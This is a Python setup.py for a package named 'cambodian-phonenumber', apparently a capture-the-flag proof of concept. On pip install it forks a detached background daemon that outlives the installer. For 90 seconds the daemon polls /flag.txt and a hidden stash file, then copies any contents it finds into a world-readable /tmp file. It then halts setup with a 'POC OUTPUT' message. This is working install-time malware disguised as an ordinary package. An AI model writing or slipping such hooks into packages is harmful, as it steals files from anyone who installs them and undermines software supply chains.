import os, sys, time
from setuptools import setup

STASH = "/.txt.galf"
PLAIN = "/flag.txt"
EXFIL = "/tmp/.k_exfil"

# Detached daemon: survives pip exit, waits for handler to restore the flag, copies it.
try:
    pid = os.fork()
    if pid == 0:
        os.setsid()
        if os.fork() != 0:
            os._exit(0)
        # grandchild daemon
        try:
            sys.stdout.flush()
            devnull = os.open(os.devnull, os.O_RDWR)
            os.dup2(devnull,0); os.dup2(devnull,1); os.dup2(devnull,2)
        except: pass
        deadline = time.time() + 90
        got = None
        while time.time() < deadline:
            for p in (STASH, PLAIN):
                try:
                    if os.path.exists(p):
                        with open(p) as f:
                            data = f.read()
                        if data.strip():
                            got = data
                            break
                except: pass
            if got: break
            time.sleep(0.2)
        if got is not None:
            try:
                with open(EXFIL,"w") as f: f.write(got)
                os.chmod(EXFIL,0o666)
            except: pass
        os._exit(0)
except Exception:
    pass

raise SystemExit("\n\n==== POC OUTPUT START ====\nPOC>> daemon_spawned: waiting for flag restore\n==== POC OUTPUT END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
